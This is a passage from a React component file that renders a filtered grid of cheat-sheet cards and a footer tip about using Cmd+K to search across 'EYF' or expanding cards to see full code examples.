            filtered.map((card) => (
              <CheatCard key={card.id} card={card} sheetColor={sheet.color} />
            ))
          )}
        </div>

        {/* Footer tip */}
        <div className="mt-10 flex items-center gap-3 bg-[#1a1a1a] border border-white/8 rounded-2xl p-5">
          <Icon name="lightbulb" size={20} className="text-yellow-400 flex-shrink-0" />
          <p className="text-zinc-400 text-sm">
            <span className="text-white font-bold">Pro tip:</span> Use{' '}
            <kbd className="bg-zinc-800 text-zinc-400 text-xs px-1.5 py-0.5 rounded font-mono">Cmd+K</kbd>{' '}
            to search for any topic across EYF, or click any card to expand the full code example.
          </p>
        </div>
      </div>
    </AppShell>
  );
}
